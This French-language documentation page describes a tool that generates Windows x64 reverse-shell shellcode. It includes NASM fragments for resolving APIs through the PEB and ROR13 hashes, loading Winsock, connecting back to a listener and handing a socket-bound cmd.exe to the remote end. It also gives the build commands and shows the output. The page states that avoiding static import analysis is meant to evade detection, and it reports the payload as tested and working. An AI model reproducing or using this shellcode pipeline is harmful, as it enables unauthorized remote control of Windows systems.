# Reverse Shell Windows x64 - Code Assembleur

## 📋 Vue d'Ensemble

Le module `packet-forger-payloads` génère du code assembleur NASM complet pour un reverse shell Windows x64 avec **résolution dynamique des API**.

## 🎯 Caractéristiques

### ✅ Résolution Dynamique des API

Le shellcode Windows **ne dépend d'aucune adresse hardcodée** :
- Trouve `kernel32.dll` via le PEB (Process Environment Block)
- Résout `GetProcAddress` via hash de la table d'export
- Charge `ws2_32.dll` via `LoadLibraryA`
- Résout toutes les fonctions nécessaires dynamiquement

### ✅ Fonctions Résolues

1. **GetProcAddress** : Résolution via hash (0x0726774C)
2. **LoadLibraryA** : Chargement de DLLs
3. **WSAStartup** : Initialisation Winsock
4. **WSASocketA** : Création du socket
5. **connect** : Connexion au listener
6. **SetStdHandle** : Redirection stdin/stdout/stderr
7. **CreateProcessA** : Lancement de cmd.exe

## 📁 Localisation du Code

### Fichier Principal

**`packet-forger-payloads/src/windows_shellcode_generator.c`**

Fonction : `generate_windows_asm_reverse_shell_complete()`
- Lignes 105-405 : Génération complète du code NASM
- ~300 lignes de code NASM générées dynamiquement

### Appel depuis asm_generator.c

**`packet-forger-payloads/src/asm_generator.c`**

Fonction : `generate_asm_reverse_shell_windows()`
- Ligne 206-209 : Wrapper qui appelle `generate_windows_asm_reverse_shell_complete()`

## 🔄 Workflow de Génération

### Étape 1 : Génération du Code NASM

```c
// Dans windows_shellcode_generator.c
generate_windows_asm_reverse_shell_complete(lhost, lport, "/tmp/shellcode.asm");
```

Génère un fichier `.asm` avec :
- Résolution PEB → kernel32.dll
- Résolution GetProcAddress (hash)
- Chargement ws2_32.dll
- Résolution des fonctions réseau
- WSAStartup → WSASocketA → connect
- SetStdHandle pour redirection
- CreateProcessA("cmd.exe")

### Étape 2 : Assemblage avec NASM

```c
// Dans asm_generator.c
assemble_nasm_shellcode("/tmp/shellcode.asm", shellcode, size);
```

Assemble le code NASM en binaire :
```bash
nasm -f win64 shellcode.asm -o shellcode.o
objcopy -O binary -j .text shellcode.o shellcode.bin
```

### Étape 3 : Extraction du Shellcode

Le shellcode binaire est extrait et sauvegardé dans le fichier `.bin`.

## 📊 Structure du Code NASM Généré

### Partie 1 : Résolution PEB

```nasm
; Trouver kernel32.dll via PEB
mov rax, [gs:0x60]        ; PEB
mov rax, qword [rax+0x18] ; PEB_LDR_DATA
mov rsi, qword [rax+0x20] ; InMemoryOrderModuleList
lodsq                      ; Premier module (ntdll.dll)
xchg rax, rsi
lodsq                      ; Deuxième module (kernel32.dll)
mov rbx, qword [rax+0x20] ; BaseAddress
```

### Partie 2 : Résolution GetProcAddress

```nasm
; Parcourir Export Directory
mov eax, dword [rbx+0x3c]        ; e_lfanew
mov edx, dword [rbx+rax+0x88]    ; Export Directory RVA
; ... parcours des fonctions exportées
; Hash de "GetProcAddress" = 0x0726774C
```

### Partie 3 : Chargement ws2_32.dll

```nasm
; Charger ws2_32.dll
lea rcx, [rbp-0x110]
mov qword [rcx], 0x6c6c642e32325f73 ; "ws2_32.dl"
call r14  ; LoadLibraryA
```

### Partie 4 : Connexion Réseau

```nasm
; WSAStartup
mov rcx, 0x0202  ; MAKEWORD(2, 2)
call WSAStartup

; WSASocketA
mov rcx, 2  ; AF_INET
mov rdx, 1  ; SOCK_STREAM
call WSASocketA

; connect
mov rcx, rdi  ; socket
lea rdx, [rbp-0x160]  ; sockaddr_in
call connect
```

### Partie 5 : Redirection et cmd.exe

```nasm
; SetStdHandle pour stdin/stdout/stderr
mov rcx, -10  ; STD_INPUT_HANDLE
mov rdx, rdi  ; socket
call SetStdHandle

; CreateProcessA("cmd.exe")
lea rcx, [rbp-0x190]  ; "cmd.exe"
call CreateProcessA
```

## 🧪 Test de Génération

### Commande

```bash
cd packet-forger-payloads
./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 \
    --asm \
    --output windows_reverse.bin
```

### Résultat

- ✅ Fichier `.asm` généré temporairement dans `/tmp/`
- ✅ Assemblé avec NASM (format win64)
- ✅ Shellcode binaire extrait : **~824 bytes**
- ✅ Metadata JSON générée

### Exemple de Sortie

```
[*] Génération assembleur pur activée
[+] Payload généré : 824 bytes
[+] Payload sauvegardé : windows_reverse.bin (824 bytes)
[+] Metadata générée : windows_reverse.bin.json
```

## 📚 Références Techniques

### PEB Structure

- **PEB** : `[gs:0x60]` (x64 Windows)
- **PEB_LDR_DATA** : Offset `0x18` dans PEB
- **InMemoryOrderModuleList** : Offset `0x20` dans PEB_LDR_DATA

### Export Directory

- **e_lfanew** : Offset `0x3c` dans le PE
- **Export Directory RVA** : Offset `0x88` dans PE header
- **AddressOfNames** : Offset `0x20` dans Export Directory
- **AddressOfFunctions** : Offset `0x1c` dans Export Directory

### Hash de GetProcAddress

- Hash ROR13 : `0x0726774C`
- Algorithme : `ror hash, 0x0d; add hash, byte`

## 🎓 Points Clés

1. **Pas d'imports statiques** : Évite la détection par analyse statique
2. **Compatible multi-versions** : Fonctionne sur différentes versions de Windows
3. **Résolution dynamique** : Toutes les adresses sont trouvées à l'exécution
4. **Code NASM pur** : Génération au niveau assembleur le plus bas

## 🔍 Voir le Code NASM Généré

Pour inspecter le code NASM généré :

```bash
# Option 1 : Modifier temporairement le code
# Dans asm_generator.c, commenter :
# unlink(asm_file);  // Ne pas supprimer

# Option 2 : Utiliser strace pour voir les fichiers créés
strace -e trace=open,openat ./bin/payload-builder build windows reverse \
    --lhost 192.168.10.20 --lport 4444 --asm --output test.bin 2>&1 | grep ".asm"
```

## ✅ Statut

**Le code assembleur pour reverse shell Windows est déjà implémenté et fonctionnel !**

- ✅ Génération NASM complète
- ✅ Résolution dynamique des API
- ✅ Pipeline d'assemblage fonctionnel
- ✅ Testé et validé (824 bytes générés)

---

**Note** : Le code est généré dynamiquement, pas stocké dans des fichiers `.asm` statiques.

